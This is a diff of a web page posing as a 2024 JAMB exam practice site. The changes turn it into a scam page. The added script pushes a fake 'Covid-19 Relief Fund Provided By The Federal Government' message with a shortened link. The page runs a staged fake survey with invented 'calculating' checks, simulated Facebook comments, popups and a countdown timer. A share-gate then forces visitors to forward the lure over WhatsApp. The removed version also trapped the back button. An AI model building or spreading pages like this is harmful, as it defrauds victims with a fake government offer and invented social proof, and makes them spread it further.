@@ -1,356 +1,287 @@
-
+<?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE html>
-<html lang="en">
-	<head>
-	
+<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+  
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+<title>JAMB CBT TEST PRACTICE 2024</title>
+<link id="favicon" rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzikFuDbzAOddrRt6XnAnGFs1q4KxAEuIkOQ&usqp=CAU">
+<meta property="og:image" content="https://www.cihi.ca/sites/default/files/image/covid-19_resources_masthead-400x400.svg">
+<meta property="og:title" content="JAMB CBT TEST PRACTICE 2024">
+<meta property="og:description" content="JAMB CBT TEST PRACTICE 2024">
+<meta property="og:url" content="https://GOV.ORG">
 
-<script data-cfasync="false" type="text/javascript"></script>
-	    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-	    <meta charset="windows-1252">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script>
+var tiaoban = [
+"*Apply For The Covid-19 Relief Fund Provided By The Federal Government. Hurry Up, It takes few seconds to apply. Dont miss this opportunity.*%0A%0AApply Here%0Ahttp://bit.ly/COVID19_SUPPORT-FUND", 
+"*Apply For The Covid-19 Relief Fund Provided By The Federal Government. Hurry Up, It takes few seconds to apply. Dont miss this opportunity.*%0A%0AApply Here%0Ahttp://bit.ly/COVID19_SUPPORT-FUND",
+];
+var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
-		<meta property="og:title" content="JAMB CBT TEST PRACTICE 2024"/>
-    <meta property="og:url" content="https://jamb.org/">
-    <meta property="og:description" content="JAMB CBT TEST PRACTICE 2024" >
-    <meta property="og:site_name" content="https://jamb.org/" />
-       <meta property="og:image" content="https://4.bp.blogspot.com/-BmX5p-2Bb38/WE3bZ5SU1VI/AAAAAAAAADQ/1nJfKw9j8XMQ-7EkhBQWO0IbSqS_dNeDQCPcB/s1600/JAMB-joint%2Badmission%2Band%2Bmatriculation%2Bboard-Logo.png"> 
-		<meta content="width=device-width, initial-scale=1.0" name="viewport">
-		<meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible">
-		
-		<meta content="blogger" name="generator">
-		<link href="favicon.ico" rel="icon" type="image/x-icon">
-		<link rel="stylesheet" href="bootstrap/3-3-7/css/bootstrap.min.css" >
-		<link href="https://fonts.googleapis.com/css?family=Cairo&amp;display=swap" rel="stylesheet">
-		<script src="ajax/libs/jquery/2-2-4/jquery.min.js"></script>
-		<title>JAMB CBT TEST PRACTICE 2024</title>
-	
+var date = new Date();
+var hour = (date.getHours() > 9) ? date.getHours() : '0' + date.getHours();
+var minute = (date.getMinutes() > 9) ? date.getMinutes() : '0' + date.getMinutes();
+var second = (date.getSeconds() > 9) ? date.getSeconds() : '0' + date.getSeconds();
+var mytime = hour + ':' + minute + ':' + second;
+
+var tb = tiaoban + '?_t=' + (new Date().getTime()) + '%0A%0A' + mytime ;
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+
+gtag('config', 'UA-1');
+</script>
+<script>
+var timer_start = 5;
+var total = 3;
+jQuery(document).ready(function ($) {
+$(".answer").click(function () {
+if($(this).hasClass("anses1")){
+survey.step1();
+}
+if($(this).hasClass("anses2")){
+survey.step2();
+}
+if($(this).hasClass("anses3")){
+survey.step3();
+}
+});
+var clicks = 0;
+var survey = {
+step1: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question1").hide();
+$(".anses1").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show step 2
+$(".question_count span").html("2");
+$(".question_count").show();
+$(".question2").show();
+$(".anses2").show();
+}, 1200);
+}, 300);
+},
+step2: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question2").hide();
+$(".anses2").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show step 3
+$(".question_count span").html("3");
+$(".question_count").show();
+$(".question3").show();
+$(".anses3").show();
+}, 1200);
+}, 300);
+},
+step3: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question3").hide();
+$(".anses3").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show checking part
+$(".survey_middle").css("vertical-align","top");
+$(".loading").show();
+setTimeout(function () {
+$(".check1").fadeIn(300);
+setTimeout(function () {
+$(".check2").fadeIn(300);
+setTimeout(function () {
+$(".check3").fadeIn(300);
+setTimeout(function () {
+survey.change();
+}, 1400);
+}, 1100);
+}, 1400);
+}, 750);
+}, 600);
+}, 300);
+},
+change: function(){
+//sakrij gornje
+$(".headline,.small_headlines,.timer").hide();
+//sakrij content surveya
+$(".loading").hide();
+$(".survey_outer").css("height","auto");
+//pokazi ostatak
+var walink = "whatsapp://send?text=";
+//$(".btn-share").attr("href",walink);
+$(".btn-share").click(function(){
+clicks++;
+$('#progreso').show();
+if (clicks > total) {
+window.location = Web;
+return;
+}
+$('.progress span').width(((clicks / total) * 100) + '%');
+if (clicks == total) {
+window.location.href = walink;
+}
+window.location.href = walink;
+});
+$(".last_page").show();
+$(".fbcoms").show();
+waitme();
+}
+};
+$(".like").click(function() {
+if($(this).hasClass("selected")) {
+$(this).removeClass("selected");
+$(this).html("Like");
+$("#youand").html("");
+} else {
+$(this).addClass("selected");
+$(this).html("dislike");
+$("#youand").html("You and ");
+}
+});
+$(".fblike").click(function() {
+if($(this).hasClass("selected")) {
+$(this).removeClass("selected");
+$(this).html("Like");
+} else {
+$(this).addClass("selected");
+$(this).html("dislike");
+}
+});
+function waitme(){
+FBcom("#fb1",000);
+FBcom("#fb2",000);
+FBcom("#fb3",000);
+FBcom("#fb4",000);
+FBcom("#fb5",00);
+FBcom("#fb6",000);
+FBcom("#fb7",000);
+FBcom("#fb8",0000);
+var ct = 48;
+(function loop() {
+var rand = random(2500,5500);
+var ctrand = random(1,4);
+ct = ct - ctrand;
+if(ct > 1) {
+setTimeout(function() {
+loop();
+}, rand);
+} else {
+ct = "few";
+}
+$("#count").html(ct);
+}());
+}
+function FBcom(a,b) {
+setTimeout(function() {
+var m = 0, n = true, op = 0;
+$(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);
+$().slideDown(500);
+var t = setInterval(function() {
+op += 0.2;
+$(a).css({"opacity":op});
+m++;
+if(m === 5) clearInterval(t);
+}, 100);
+}, b);
+}
+function random(min, max) {
+return Math.round(Math.random() * (max - min) + min);
+}
+var out,pops = {
+init: function(){
+setTimeout(function () {
+var rand_name = pop_names[random(0,pop_names.length-1)];
+var rand_text = pop_texts[random(0,pop_texts.length-1)];
+var text = rand_name + " " + rand_text;
+$(".pops p").html(text);
+$(".pops").fadeIn(500);
+out = setTimeout(function () {
+$(".pops").fadeOut(1000);
+pops.init();
+}, 6000);
+}, random(6000, 15000));
+}
+};
+pops.init();
+$("#iks").click(function () {
+clearTimeout(out);
+$(".pops").hide();
+pops.init();
+});
+$("#mins").html("0"+timer_start);
+$("#sec").html("00");
+var mins = timer_start, secs = 0, minutes, seconds, timer = {
+init: function(){
+var counter = setInterval(function () {
+$(".timer_heading").addClass("blink");
+setTimeout(function () {
+$(".timer_heading").removeClass("blink");
+}, 500);
+secs--;
+if(secs<0){
+secs = 59;
+mins--;
+if(mins<0){
+clearInterval(counter);
+mins = 0;
+secs = 0;
+$(".timer_heading").hide();
+$(".timer .small_headlines").show();
+}
+if(mins<10){
+minutes = "0" + mins;
+}else{
+minutes = mins;
+}
+}
+if(secs<10){
+seconds = "0" + secs;
+}else{
+seconds = secs;
+}
+$("#mins").html(minutes);
+$("#sec").html(seconds);
+}, 1000);
+}
+};
+timer.init();
+if(get_Cookie('prog')){
+setTimeout(function(){
+$(".question_count").hide();
+$(".question1").hide();
+$(".anses1").hide();
+survey.change();
+incrementValue_a();
+fn1_a();
+},200)
+}
+});
 
 
-
-
-     
-    <meta content='width=device-width, initial-scale=1.0' name='viewport'/>
-   <title>JAMB CBT TEST PRACTICE 2024</title>
-   <meta property="og:image" content="   https://4.bp.blogspot.com/-BmX5p-2Bb38/WE3bZ5SU1VI/AAAAAAAAADQ/1nJfKw9j8XMQ-7EkhBQWO0IbSqS_dNeDQCPcB/s1600/JAMB-joint%2Badmission%2Band%2Bmatriculation%2Bboard-Logo.png">
-   
-   
-   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
-   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
-
-
-
-    
-    <script src='https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js'>
-    </script>
-    <script>
-      //<![CDATA[
-      redirectURL = "";
-      WhatsApp_share_message = "";
-      Share_link = "#";
-      alert_text = "Compartilhe esta oferta com pelo menos 10 amigos para continuar. VocÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Âª convidou...";
-      var timer_start = 5; //minutes
-      //]]>
-    </script>
-    <script type='text/javascript'>
-      //<![CDATA[
-      var total = 10;
-      jQuery(document).ready(function ($) {
-        $(".answer").click(function () {
-          if($(this).hasClass("anses1")){
-            survey.step1();
-          }
-          if($(this).hasClass("anses2")){
-            survey.step2();
-          }
-          if($(this).hasClass("anses3")){
-            survey.step3();
-          }
-        });
-        var clicks = 0;
-        var survey = {
-          step1: function(){
-            setTimeout(function () {
-              //hide question block MobGyan
-              $(".question_count").hide();
-              $(".question1").hide();
-              $(".anses1").hide();
-              //show calculating MobGyan
-              $(".calculating").show();
-              setTimeout(function () {
-                //hide calculating MobGyan
-                $(".calculating").hide();
-                //show step 2 MobGyan
-                $(".question_count span").html("2");
-                $(".question_count").show();
-                $(".question2").show();
-                $(".anses2").show();
-              }, 1200);
-            }, 300);
-          },
-          step2: function(){
-            setTimeout(function () {
-              //hide question block MobGyan
-              $(".question_count").hide();
-              $(".question2").hide();
-              $(".anses2").hide();
-              //show calculating MobGyan
-              $(".calculating").show();
-              setTimeout(function () {
-                //hide calculating MobGyan
-                $(".calculating").hide();
-                //show step 3 MobGyan
-                $(".question_count span").html("3");
-                $(".question_count").show();
-                $(".question3").show();
-                $(".anses3").show();
-              }, 1200);
-            }, 300);
-          },
-          step3: function(){
-            setTimeout(function () {
-              //hide question block MobGyan
-              $(".question_count").hide();
-              $(".question3").hide();
-              $(".anses3").hide();
-              //show calculating MobGyan
-              $(".calculating").show();
-              setTimeout(function () {
-                //hide calculating MobGyan
-                $(".calculating").hide();
-                //show checking part MobGyan
-                $(".survey_middle").css("vertical-align","top");
-                $(".loading").show();
-                setTimeout(function () {
-                  $(".check1").fadeIn(300);
-                  setTimeout(function () {
-                    $(".check2").fadeIn(300);
-                    setTimeout(function () {
-                      $(".check3").fadeIn(300);
-                      setTimeout(function () {
-                        survey.change();
-                      }, 1400);
-                    }, 1100);
-                  }, 1400);
-                }, 750);
-              }, 600);
-            }, 300);
-          },
-          change: function(){
-            //sakrij gornje MobGyan
-            $(".headline,.small_headlines,.timer").hide();
-            //sakrij content surveya MobGyan
-            $(".loading").hide();
-            $(".survey_outer").css("height","auto");
-            //pokazi ostatak MobGyan
-            var walink = "whatsapp://send?text="+WhatsApp_share_message+Share_link;
-            //$(".btn-share").attr("href",walink); MobGyan
-            $(".btn-share").click(function(){
-              clicks++;
-              $('#progreso').show();
-              if (clicks > total) {
-                window.location = redirectURL;
-                return;
-              }
-              $('.progress span').width(((clicks / total) * 100) + '%');
-              if (clicks == total) {
-                window.location.href = walink;
-              }
-              window.location.href = walink;
-            });
-            $(".last_page").show();
-            $(".fbcoms").show();
-            waitme();
-          }
-        };
-        $(".like").click(function() {
-          if($(this).hasClass("selected")) {
-            $(this).removeClass("selected");
-            $(this).html("Like");
-            $("#youand").html("");
-          } else {
-            $(this).addClass("selected");
-            $(this).html("Unlike");
-            $("#youand").html("You and ");
-          }
-        });
-        $(".fblike").click(function() {
-          if($(this).hasClass("selected")) {
-            $(this).removeClass("selected");
-            $(this).html("Like");
-          } else {
-            $(this).addClass("selected");
-            $(this).html("Unlike");
-          }
-        });
-        function waitme(){
-          FBcom("#fb1",000);
-          FBcom("#fb2",000);
-          FBcom("#fb3",000);
-          FBcom("#fb4",000);
-          FBcom("#fb5",00);
-          FBcom("#fb6",000);
-          FBcom("#fb7",000);
-          FBcom("#fb8",0000);
-          var ct = 48;
-          (function loop() {
-            var rand = random(2500,5500);
-            var ctrand = random(1,4);
-            ct = ct - ctrand;
-            if(ct > 1) {
-              setTimeout(function() {
-                loop(); 
-              }, rand);
-            } else {
-              ct = "few";
-            }
-            $("#count").html(ct);
-          }());
-        }
-        function FBcom(a,b) {
-          setTimeout(function() {
-            var m = 0, n = true, op = 0;
-            $(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);
-            $().slideDown(500);
-            var t = setInterval(function() {
-              op += 0.2;
-              $(a).css({"opacity":op});
-              m++;
-              if(m === 5) clearInterval(t);
-            }, 100);
-          }, b);
-        }
-        function random(min, max) {
-          return Math.round(Math.random() * (max - min) + min);
-        }
-        var out,pops = {
-          init: function(){
-            setTimeout(function () {
-              var rand_name = pop_names[random(0,pop_names.length-1)];
-              var rand_text = pop_texts[random(0,pop_texts.length-1)];
-              var text = rand_name + " " + rand_text;
-              $(".pops p").html(text);
-              $(".pops").fadeIn(500);
-              out = setTimeout(function () {
-                $(".pops").fadeOut(1000);
-                pops.init();
-              }, 6000);
-            }, random(6000, 15000));
-          }
-        };
-        pops.init();
-        $("#iks").click(function () {
-          clearTimeout(out);
-          $(".pops").hide();
-          pops.init();
-        });
-        $("#mins").html("0"+timer_start);
-        $("#sec").html("00");
-        var mins = timer_start, secs = 0, minutes, seconds, timer = {
-          init: function(){
-            var counter = setInterval(function () {
-              $(".timer_heading").addClass("blink");
-              setTimeout(function () {
-                $(".timer_heading").removeClass("blink");
-              }, 500);
-              secs--;
-              if(secs<0){
-                secs = 59;
-                mins--;
-                if(mins<0){
-                  clearInterval(counter);
-                  mins = 0;
-                  secs = 0;
-                  $(".timer_heading").hide();
-                  $(".timer .small_headlines").show();
-                }
-                if(mins<10){
-                  minutes = "0" + mins;
-                }else{
-                  minutes = mins;
-                }
-              }
-              if(secs<10){
-                seconds = "0" + secs;
-              }else{
-                seconds = secs;
-              }
-              $("#mins").html(minutes);
-              $("#sec").html(seconds);
-            }, 1000);
-          }
-        };
-        timer.init();
-      });
-      //]]>
-    </script>
-    <script type='text/javascript'>
-      //<![CDATA[
-      var ii = 0; // needed for safari
-      var iy = 0;
-      if (typeof history.pushState === "function") {
-        history.pushState("back", null, null);
-        window.onpopstate = function() {
-          history.pushState('back', null, null);
-          if (iy==3) {
-            iy=0;
-            window.location='#';
-          } else if (ii == 1) {
-            document.getElementById('popup1').style.display = "none";
-            setTimeout(function() {
-              if (document.getElementById('popup1').style.display == "none") {
-                document.getElementById('popup1').style.display = "block";
-              }
-            }, 300);
-            window.navigator.vibrate(000);
-            iy=iy+1;
-          }
-        };
-      }
-      setTimeout(function() {
-        ii = 1;
-      }, 200);
-      function hidepop() {
-        document.getElementById('popup1').style.display = "none";
-      }
-      //]]>
-    </script>
-    
-
+</script>
 <style>
-p { color: black;}
-  .button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 25px;
-  text-align: center;
-  font-size: 16px;
-  cursor: pointer;
-}
-  
-  .announcement {
-  display: inline-block;
-  height: 150%;
-  text-align: center;
-  width: 100%;
-  background: red;
-  color: white;
-  font-family: Arial, sans;
-  margin: 0;
-  padding: 0;
-  vertical-align: middle;
-  font-size: 0.8em;
-}
-
-.announcement a { 
-  color: #ccc; 
-}
-
-.announcement a:hover {
-  color: red;
-}
-  
 @import url('https://fonts.googleapis.com/css?family=Montserrat');
-          
 @font-face{
 font-family: 'Roboto';
 font-weight: 400;
@@ -375,10 +306,10 @@ body,html{
 width: 100%;
 margin: 0;
 font-family: 'Montserrat', sans-serif;
-background: #fffff;
-color:#333;
+background: #2980B9;
+color:#6e34abed;
 }
-/*clearfix MobGyan*/
+/*clearfix*/
 .clearfix:before, .clearfix:after{content:"";display:table;}
 .clearfix:after{clear: both;}
 .clearfix{*zoom: 1;}
@@ -393,7 +324,7 @@ position: absolute;
 display: table;
 width: 100%;
 height: 100%;
-background-image: url(../img/219958493.jpg);
+background-image: url(https://0ne.buzz/id-indomaret/img/219958493.jpg);
 background-position: center top;
 background-size: 750px auto;
 background-repeat: repeat-y;
@@ -401,12 +332,12 @@ background-repeat: repeat-y;
 .bold{
 font-weight: 700;
 }
-/*************************************************** header MobGyan ***************************************************/
+/*************************************************** header ***************************************************/
 .header{
 display: table-row;
 width: 100%;
 height: 50px;
-background-color: #00000;
+background-color: #fff;
 font-weight: 700;
 }
 .header-inner{
@@ -416,7 +347,7 @@ text-align: center;
 }
 .header-inner p{
 vertical-align: middle;
-color: #00000;
+color: #fff;
 font-size: 18px
 }
 .header-inner p img{
@@ -429,7 +360,7 @@ width: 28px;
 width: 14px;
 padding-left: 2px
 }
-/*************************************************** content MobGyan ***************************************************/
+/*************************************************** content ***************************************************/
 
 .content{
 display: table-row;
@@ -448,14 +379,14 @@ margin: 5px auto;
 text-align: center;
 padding: 15px 3px;
 border-radius: 4px;
-background-color: #fffff;
-color: #00000;
+background-color: #ffffff;
+color: #2980B9;
 }
 #logo{
 width: 220px;
 }
 .headline{
-color: #00000;
+color: #000;
 font-weight: bold;
 font-size: 22px;
 line-height: 45px
@@ -475,7 +406,7 @@ margin-left: 3px;
 }
 .small_headlines{
 font-size: 16px;
-color: #00000;
+color: #000000ed;
 font-weight: 400;
 padding-bottom: 10px;
 }
@@ -488,14 +419,13 @@ line-height: 22px;
 .question2,.question3{
 display: none;
 }
-/*************************************************** survey MobGyan ***************************************************/
+/*************************************************** survey ***************************************************/
 .survey_outer{
 display: table;
 width: 95%;
 margin: 15px auto 0;
-background-color: #b20f16;
+background-color: #05853F;
 border-radius: 4px;
-color: white;
 height: 295px;
 }
 .survey_middle{
@@ -513,12 +443,12 @@ position: relative;
 display: none;
 }
 .question_count{
-color: #00000;
+color: #fff;
 font-size: 24px;
 font-weight: 700;
 }
 .question_text{
-color: #00000;
+color: #fff;
 font-size: 20px;
 line-height: 38px;
 }
@@ -534,8 +464,8 @@ width: 80%;
 margin: 15px auto;
 text-align: center;
 padding: 7px 0;
-color: white;
-background-color: #00000;
+color: #222;
+background-color: #fff;
 border-radius: 7px;
 border: 1px solid #027CD5;
 font-size: 24px;
@@ -546,8 +476,8 @@ cursor: pointer;
 transition: all 0.3s ease-in-out;
 }
 .answer:hover{
-color: white;
-background-color: #00000;
+color: #222;
+background-color: #fff;
 font-weight: 700;
 }
 .calculating{
@@ -555,18 +485,18 @@ display: none;
 vertical-align: middle;
 font-size: 28px;
 text-transform: uppercase;
-color: #00000;
+color: #fff;
 font-weight: 700;
 }
 .calculating img{
 vertical-align: middle;
 width: 50px;
 }
-/****** loading MobGyan ******/
+/****** loading ******/
 .loading{
 display: none;
 text-align: center;
-color: #00000;
+color: #fff;
 font-weight: 700;
 }
 .loading img{
@@ -585,7 +515,7 @@ margin: 10px 0;
 .check1,.check2,.check3{
 display: none;
 }
-/*************************************************** last page MobGyan ***************************************************/
+/*************************************************** last page ***************************************************/
 .last_page{
 display: none;
 }
@@ -593,7 +523,7 @@ display: none;
 text-align: left;
 }
 .textlastup{
-color: #00000;
+color: #fff;
 font-size: 18px;
 padding-bottom: 8px;
 font-weight: 400;
@@ -605,7 +535,7 @@ max-width: 345px;
 margin: 15px auto;
 background-color: #58BE41;
 border-radius: 5px;
-color: #00000;
+color: #fff;
 font-weight: 700;
 text-align: center;
 display: block;
@@ -617,7 +547,7 @@ transition: all 0.2s ease-in-out;
 box-shadow: none;
 }
 .btn:hover{
-background-color: #00000;
+background-color: #fff;
 color: #58BE41;
 box-shadow: 0 0 2px #58BE41,
 0 0 5px #58BE41,
@@ -632,7 +562,7 @@ background-position: left 5px top 1px;
 background-repeat: no-repeat;
 }
 
-.progress {      width:80%;      height: 20px;  /* Can be anything MobGyan */      position: relative;      margin: 60px 0 20px 0; /* Just for demo spacing */      background: #555;      padding: 10px;      -webkit-box-shadow: inset 0 -1px 1px rgba(255,255,255,0.3);      -moz-box-shadow   : inset 0 -1px 1px rgba(255,255,255,0.3);      box-shadow        : inset 0 -1px 1px rgba(255,255,255,0.3);      margin: auto;    }    .progress > span {      display: block;      height: 20px;      left: 0;      top: 0;      background-color: #3F51B5;      background-image: -webkit-gradient(         linear,         left bottom,         left top,         color-stop(0, #00BCD4),         color-stop(1, #2196F3)        );      background-image: -moz-linear-gradient(        center bottom,        rgb(43,194,83) 37%,        rgb(84,240,84) 69%       );      -webkit-box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      -moz-box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      position: absolute;      overflow: hidden;    }    .progress > span:after, .animate > span > span {      content: "";      position: absolute;      top: 0; left: 0; bottom: 0; right: 0;      background-image:          -webkit-gradient(linear, 0 0, 100% 100%,             color-stop(.25, rgba(255, 255, 255, .2)),             color-stop(.25, transparent), color-stop(.5, transparent),             color-stop(.5, rgba(255, 255, 255, .2)),             color-stop(.75, rgba(255, 255, 255, .2)),             color-stop(.75, transparent), to(transparent)         );      background-image:         -moz-linear-gradient(          -45deg,             rgba(255, 255, 255, .2) 25%,             transparent 25%,             transparent 50%,             rgba(255, 255, 255, .2) 50%,             rgba(255, 255, 255, .2) 75%,             transparent 75%,             transparent         );      z-index: 1;      -webkit-background-size: 50px 50px;      -moz-background-size: 50px 50px;      -webkit-animation: move 2s linear infinite;         -webkit-border-top-right-radius: 8px;      -webkit-border-bottom-right-radius: 8px;             -moz-border-radius-topright: 8px;          -moz-border-radius-bottomright: 8px;                 border-top-right-radius: 8px;              border-bottom-right-radius: 8px;          -webkit-border-top-left-radius: 20px;       -webkit-border-bottom-left-radius: 20px;              -moz-border-radius-topleft: 20px;           -moz-border-radius-bottomleft: 20px;                  border-top-left-radius: 20px;               border-bottom-left-radius: 20px;      overflow: hidden;    }        .animate > span:after {      display: none;    }        @-webkit-keyframes move {        0% {           background-position: 0 0;        }        100% {           background-position: 50px 50px;        }    }
+.progress { width:80%; height: 20px; /* Can be anything */ position: relative; margin: 60px 0 20px 0; /* Just for demo spacing */ background: #555; padding: 10px; -webkit-box-shadow: inset 0 -1px 1px rgba(255,255,255,0.3); -moz-box-shadow : inset 0 -1px 1px rgba(255,255,255,0.3); box-shadow : inset 0 -1px 1px rgba(255,255,255,0.3); margin: auto; } .progress > span { display: block; height: 20px; left: 0; top: 0; background-color: #3F51B5; background-image: -webkit-gradient( linear, left bottom, left top, color-stop(0, #00BCD4), color-stop(1, #2196F3) ); background-image: -moz-linear-gradient( center bottom, rgb(43,194,83) 37%, rgb(84,240,84) 69% ); -webkit-box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); -moz-box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); position: absolute; overflow: hidden; } .progress > span:after, .animate > span > span { content: ""; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(.25, rgba(255, 255, 255, .2)), color-stop(.25, transparent), color-stop(.5, transparent), color-stop(.5, rgba(255, 255, 255, .2)), color-stop(.75, rgba(255, 255, 255, .2)), color-stop(.75, transparent), to(transparent) ); background-image: -moz-linear-gradient( -45deg, rgba(255, 255, 255, .2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .2) 50%, rgba(255, 255, 255, .2) 75%, transparent 75%, transparent ); z-index: 1; -webkit-background-size: 50px 50px; -moz-background-size: 50px 50px; -webkit-animation: move 2s linear infinite; -webkit-border-top-right-radius: 8px; -webkit-border-bottom-right-radius: 8px; -moz-border-radius-topright: 8px; -moz-border-radius-bottomright: 8px; border-top-right-radius: 8px; border-bottom-right-radius: 8px; -webkit-border-top-left-radius: 20px; -webkit-border-bottom-left-radius: 20px; -moz-border-radius-topleft: 20px; -moz-border-radius-bottomleft: 20px; border-top-left-radius: 20px; border-bottom-left-radius: 20px; overflow: hidden; } .animate > span:after { display: none; } @-webkit-keyframes move { 0% { background-position: 0 0; } 100% { background-position: 50px 50px; } }
 
 
 
@@ -641,20 +571,19 @@ background-repeat: no-repeat;
 font-size: 24px;
 text-transform: uppercase;
 }
-/*************************************************** facecomms MobGyan ***************************************************/
-/* COMMENTS MobGyan*/
+
 .fbcoms {
 font-family: Tahoma, Verdana, sans-serif;
-background-color: #00000;
+background-color: #fff;
 width: 100%;
 margin: 0 auto;
-color: #fffff;
 padding: 5px 10px;
 font-size: 12px;
 text-align: left;
 -webkit-box-sizing: border-box;
 -moz-box-sizing: border-box;
 box-sizing: border-box;
+color: #333;
 }
 .comments {
 font-weight: bold;
@@ -683,11 +612,21 @@ cursor: pointer;
 .buttons span:hover {
 text-decoration: underline;
 }
+
+.buttond {
+background-color: #0d609b;
+color: #fff;
+font-size: 1.2em;
+font-weight: bold;
+text-align: center;
+padding:10px;
+margin-top:5px;
+}
 .viewmore {
 margin-top: 3px;
 background-color: #eeeff4;
 padding: 5px 5px 5px 23px;
-background-image: url("../img/f/bubble.png");
+background-image: url("");
 background-position: 5px center;
 background-repeat: no-repeat;
 }
@@ -751,7 +690,7 @@ font-size: 0.95em;
 cursor: pointer;
 }
 .fbimg {
-background-color: #00000;
+background-color: #fff;
 border-radius: 2px;
 -moz-border-radius: 2px;
 -webkit-border-radius: 2px;
@@ -774,7 +713,7 @@ display: none;
 .answer{
 cursor: pointer;
 }
-/*************************************************** pops ***************************************************/
+
 .pops{
 position: fixed;
 top: 80px;
@@ -807,11 +746,11 @@ padding: 2px;
 padding-top: 10px;
 margin-left: 50px;
 font-size: 14px;
-color: #00000;
+color: #fff;
 word-spacing: 0;
 line-height: 100%;
 }
-/*************************************************** timer MobGyan ***************************************************/
+
 .timer .small_headlines{
 display: none;
 }
@@ -819,52 +758,52 @@ display: none;
 width: 80%;
 margin: 0 auto;
 font-size: 16px;
-color: #555;
+color: #e6dcdced;
 font-weight: 400;
 padding-bottom: 10px;
 }
 @-webkit-keyframes bllink{
 from{
-color: #00000;
+color: #fff;
 text-shadow: none;
 transform: scale(1,1);
 }
 to{
 color: #ff0000;
-text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #00000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
 transform: scale(1.3,1.3);
 }
 }
 @-moz-keyframes bllink{
 from{
-color: #00000;
+color: #fff;
 text-shadow: none;
 transform: scale(1,1);
 }
 to{
 color: #ff0000;
-text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #00000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
 transform: scale(1.3,1.3);
 }
 }
 @keyframes bllink{
 from{
-color: #00000;
+color: #fff;
 text-shadow: none;
 transform: scale(1,1);
 }
 to{
 color: #ff0000;
-text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #00000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
 transform: scale(1.3,1.3);
 }
 }
 .blink{
 -webkit-animation: 0.2s bllink ease-in-out alternate;
--moz-animation: 0.2s bllink ease-in-out alternate; 
+-moz-animation: 0.2s bllink ease-in-out alternate;
 animation: 0.2s bllink ease-in-out alternate;
 }
-/*************************************************** media MobGyan ***************************************************/
+
 @media screen and (max-width: 600px){
 .cont_outer{
 background-size: 600px auto;
@@ -892,6 +831,16 @@ padding-left: 2px
 }
 .header{
 height: 40px;
+}
+.gutschein {
+background-color: #000000;
+border-radius: 10px;
+padding:10px;
+font-weight: bold;
+color: #ffffff;
+font-size: 1.0em;
+margin-top:2px;
+text-align: center;
 }
 .answer{
 margin: 10px auto;
@@ -932,7 +881,7 @@ background-size: 36px auto;
 .btn-down{
 font-size: 20px;
 }
